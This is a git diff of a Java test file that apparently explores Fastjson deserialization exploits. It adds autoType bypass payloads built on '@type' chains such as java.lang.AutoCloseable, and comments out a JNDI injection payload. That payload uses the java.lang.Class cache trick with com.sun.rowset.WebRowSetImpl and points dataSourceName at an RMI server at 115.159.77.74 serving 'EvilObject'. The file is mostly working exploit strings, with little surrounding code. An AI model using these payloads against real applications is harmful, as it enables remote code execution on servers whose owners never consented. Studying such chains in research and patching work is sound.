@@ -9,6 +9,10 @@ import com.alibaba.fastjson.JSON;
 public class FastJsonTest {
 
     public static void main(String[] args) {
+        System.out.println(JSON.VERSION);
+
+//        ParserConfig.getGlobalInstance().addAccept("com.alipay");
+
         //序列化
 //        User user = new User();
 //        user.setId((long) 1);
@@ -17,9 +21,13 @@ public class FastJsonTest {
 //        System.out.println(jsonString);
 
 
+
         //反序列化
 //        String jsonString0 = "{\"@type\":\"fastjson.User\", \"names\":{}}";
-//        JSON.parse(jsonString0);
+        String jsonString0 = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\": \"fastjson.User2\"}";
+//        String jsonString0 = "{\"@type\":\"java.lang.Comparable\"{\"@type\": \"fastjson.User\"}";
+//        String jsonString0 = "{\"@type\":\"java.lang.reflect.Executable\"{\"@type\": \"fastjson.User\"}";
+        JSON.parseObject(jsonString0);
 
 //        反序列化
 //        String jsonString1 = "{\"@type\":\"java.lang.String\",\"val\":\"com.sun.rowset.\"}";
@@ -27,8 +35,8 @@ public class FastJsonTest {
 
 
         // 利用缓存1
-        String jsonString2 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.WebRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.WebRowSetImpl\",\"dataSourceName\":\"rmi://115.159.77.74:2333/EvilObject\",\"autoCommit\":true}},age:11}";
-        JSON.parseObject(jsonString2);
+//        String jsonString2 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.WebRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.WebRowSetImpl\",\"dataSourceName\":\"rmi://115.159.77.74:2333/EvilObject\",\"autoCommit\":true}},age:11}";
+//        JSON.parseObject(jsonString2);
 
 //
 //
